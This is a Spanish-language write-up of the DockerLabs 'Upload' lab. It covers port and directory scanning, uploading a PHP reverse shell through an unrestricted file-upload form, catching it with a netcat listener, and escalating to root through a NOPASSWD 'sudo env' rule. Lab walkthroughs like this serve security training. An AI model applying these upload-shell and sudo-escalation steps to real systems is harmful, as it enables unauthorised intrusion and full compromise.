# Upload
https://dockerlabs.es

*24/5/2024*

## ENUMERACION

```
└─$ nmap -p- --open --min-rate 5000 -sCV 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-24 18:04 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00043s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)

```
Enumeracion de directorios web
```
└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,php.wak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,php.wak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 1361]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/upload.php           (Status: 200) [Size: 1357]
===============================================================
Finished
===============================================================

```


## ANALISIS DE VULNERABILIDADES

Esta pagina que descrubrimos funciona con php y permite cargar archivos para luego ser ejecutados

```
![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/d968530a-dd07-485c-9de2-750e03411c7d)

```


## EXPLOTACION

Crearemos un archivo .php el cual genere una reverse shell, puedes utilizar esta pagina para generarla, descargarla por github o crearla tu mismo

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/507a7464-bb1c-4abd-8d9e-f4baa5e1cd6d)

Lo cargamos a la pagina

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/c9436da4-3a09-49de-ac7c-ae4dc3746ecb)

Nos ponemos en escucha por el puerto 443
```
└─$ sudo nc -nvlp 443                              
listening on [any] 443 ...
```

Y lo ejecutamos por medio del navegador

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/d64cdff7-94a2-4c26-aa09-5adbdf32764b)

Y nos devolvera una reverse shell
```
connect to [192.168.0.22] from (UNKNOWN) [172.17.0.2] 53608
SOCKET: Shell has connected! PID: 61
whoami
www-data
```


## POST-EXPLOTACION

Escalamos privilegios
```
sudo -l
Matching Defaults entries for www-data on 0936e4313479:                                                             
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 0936e4313479:
    (root) NOPASSWD: /usr/bin/env
sudo env /bin/sh
whoami
root
```

Y tratamos las TTY
```
script /dev/null -c bash
Script started, output log file is '/dev/null'.                                                                     
root@0936e4313479:/var/www#
```
